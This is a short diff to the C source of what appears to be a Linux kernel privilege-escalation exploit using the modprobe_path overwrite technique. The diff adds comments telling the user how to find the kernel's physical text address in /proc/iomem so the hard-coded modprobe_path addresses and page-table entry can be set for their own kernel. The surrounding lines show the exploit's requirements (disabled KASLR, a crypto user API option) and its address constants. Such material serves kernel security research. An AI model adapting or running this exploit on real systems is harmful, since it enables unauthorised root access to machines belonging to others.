@@ -14,6 +14,7 @@
  * Requirements:
  *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
  *  2) Disable KASLR and update the MODPROBE_PATH_ADDR below
+ *  3) See "Kernel code" in /proc/iomem and update KERNEL_TEXT_PHYS_ADDR
  */
 
 #define _GNU_SOURCE
@@ -190,6 +191,7 @@ int flush_tlb(void *addr, size_t len)
 #define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
 #define KERNEL_TEXT_ADDR 0xffffffff81000000lu
 #define MODPROBE_PATH_ADDR_OFFSET (MODPROBE_PATH_ADDR - KERNEL_TEXT_ADDR)
+/* See "Kernel code" in /proc/iomem to update KERNEL_TEXT_PHYS_ADDR for your kernel */
 #define KERNEL_TEXT_PHYS_ADDR 0x1000000lu
 #define MODPROBE_PATH_PHYS_ADDR (KERNEL_TEXT_PHYS_ADDR + MODPROBE_PATH_ADDR_OFFSET)
 #define MODPROBE_PATH_PTE_ENTRY ((MODPROBE_PATH_PHYS_ADDR & 0xfffffffffffff000lu) + PT_BITS)
